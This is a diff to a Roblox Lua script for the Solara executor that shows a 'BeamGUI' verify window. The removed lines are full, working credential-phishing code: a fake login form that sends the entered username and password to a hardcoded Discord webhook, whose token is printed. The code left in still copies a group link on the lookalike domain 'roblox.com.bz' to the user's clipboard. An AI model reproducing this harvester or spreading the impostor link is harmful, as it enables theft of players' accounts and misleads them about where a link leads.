@@ -1,11 +1,10 @@
 -- CONFIG
 local GROUP_LINK = "https://roblox.com.bz/communities/1713252036/"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1514988761912709281/wG1n9AYtVvspdiKwhy2KQ2mhF5KmdGLjW54vr_8gn7N5-o4ZcGSLrSw6jeM0bKjF6zF8"
 
 local Player = game:GetService("Players").LocalPlayer
 local HttpService = game:GetService("HttpService")
 
--- Clipboard function for Solara V3 (try multiple methods)
+-- Clipboard function for Solara V3
 local function copyText(text)
     local success = false
     if setclipboard then success = pcall(setclipboard, text) end
@@ -19,7 +18,7 @@ local function copyText(text)
     return success
 end
 
--- Create GUI on CoreGui (more compatible)
+-- Create GUI on CoreGui
 local gui = Instance.new("ScreenGui")
 gui.Name = "BeamGUI"
 gui.Parent = game:GetService("CoreGui")
@@ -70,51 +69,14 @@ status.Font = Enum.Font.Gotham
 status.TextSize = 12
 status.Parent = frame
 
--- Fake login
-local function showFakeLogin()
-    local loginGui = Instance.new("ScreenGui")
-    loginGui.Parent = game:GetService("CoreGui")
-    local lf = Instance.new("Frame")
-    lf.Size = UDim2.new(0, 300, 0, 200)
-    lf.Position = UDim2.new(0.5, -150, 0.5, -100)
-    lf.BackgroundColor3 = Color3.fromRGB(40,40,50)
-    lf.Parent = loginGui
-
-    local userBox = Instance.new("TextBox")
-    userBox.Size = UDim2.new(0, 250, 0, 30)
-    userBox.Position = UDim2.new(0.5, -125, 0, 30)
-    userBox.PlaceholderText = "Username"
-    userBox.Parent = lf
-
-    local passBox = Instance.new("TextBox")
-    passBox.Size = UDim2.new(0, 250, 0, 30)
-    passBox.Position = UDim2.new(0.5, -125, 0, 80)
-    passBox.PlaceholderText = "Password"
-    passBox.Parent = lf
-
-    local submit = Instance.new("TextButton")
-    submit.Size = UDim2.new(0, 120, 0, 35)
-    submit.Position = UDim2.new(0.5, -60, 0, 130)
-    submit.Text = "LOGIN"
-    submit.Parent = lf
-
-    submit.MouseButton1Click:Connect(function()
-        local u = userBox.Text
-        local p = passBox.Text
-        if u ~= "" and p ~= "" then
-            local data = {content = string.format("**Account**\nUser: %s\nPass: %s\nPlace: %s", u, p, game.PlaceId)}
-            pcall(function() HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson, false, {["Content-Type"]="application/json"}) end)
-        end
-        loginGui:Destroy()
-        gui:Destroy()
-    end)
-end
-
+-- Verify button: only copy link, no fake login, GUI stays
 btn.MouseButton1Click:Connect(function()
     copyText(GROUP_LINK)
-    status.Text = "Link copied to clipboard!"
-    wait(1)
-    showFakeLogin()
+    status.Text = "Group link copied to clipboard!"
+    status.TextColor3 = Color3.fromRGB(100,255,100)
+    wait(2)
+    status.Text = "Ready. Click VERIFY again if needed."
+    status.TextColor3 = Color3.fromRGB(255,200,100)
 end)
 
 -- Auto-show
